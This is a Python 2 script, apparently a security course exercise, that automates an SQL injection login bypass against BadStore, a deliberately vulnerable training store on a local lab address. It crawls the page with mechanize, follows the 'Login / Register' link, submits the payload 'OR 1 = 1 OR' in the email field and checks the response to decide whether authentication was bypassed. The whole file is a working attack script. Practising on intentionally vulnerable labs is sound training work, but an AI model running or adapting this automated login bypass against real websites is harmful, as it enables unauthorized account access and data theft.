#!/usr/bin/python
import mechanize

##############################
# SPSE Module 4 Lesson 8. Ex 1
# Create a PoC. SQL Injection using Mechanize
# This PoC is created taking BadStore as vulnerable app (192.168.1.4)
# Badstore official Web Page: http://badstore.net/
# 
# I found a SQL Injection Vuln on the "LogIn / Register" Link. That's what I will try to 
# automate (SQL injection on forms). Link is: http://192.168.1.4/cgi-bin/badstore.cgi?action=loginregister
##############################

def sqlinj_attack_login(url):
  br = mechanize.Browser()
  br.set_handle_robots(False)   			# ignore robots
  br.addheaders = [('User-agent', 'Firefox')]       	# [('User-agent', 'Firefox')]

  response = br.open(url)
  if response.code != 200:
    print 'Web Page could not be retrieved from %s. Please verify your URL' %(url)
    exit
  
  print """====================================
Link(s) found in Document:
===================================="""
  for link in br.links():
    print "[Link name]: %s - [Link URL]: %s" %(link.text, link.url)

  print '\n\n -- Following "LogIn / Register" Link'
  GB_link = br.find_link(text = 'Login / Register')
  print '+[Link]: %s' %(GB_link.url)
  response = br.follow_link(GB_link)
  
  # I select the 2nd form (I know the name field is on the second form (know from manually analyzung the HTML
  br.form = list(br.forms())[1]
 
  # Select the specific input field and fill the form with the SQLi Text
  sqli_txt = "'OR 1 = 1 OR'"
  br.form['email'] = sqli_txt
  br.submit()

  # Reading the response. If the SQLi attack was succesful we will get the "Welcome" text in the HTML body
  # So to verify this we will look at the body
  html = br.response().readlines()
  # Converting the HTML response to string to look for the "injected" string
  str_html = str(html)
  if str_html.find("UserID and Password not found!") < 0:
    print '++[The string: "UserID and Password not found!" was not foun in the response.\n Apparently, this attack was succesful !!]++'
    print '    -[Vulnerable link]: %s - %s' %(GB_link.text, GB_link.url)

def main():
  url = 'http://192.168.1.4'
  sqlinj_attack_login(url)

if __name__ == '__main__':
  main()
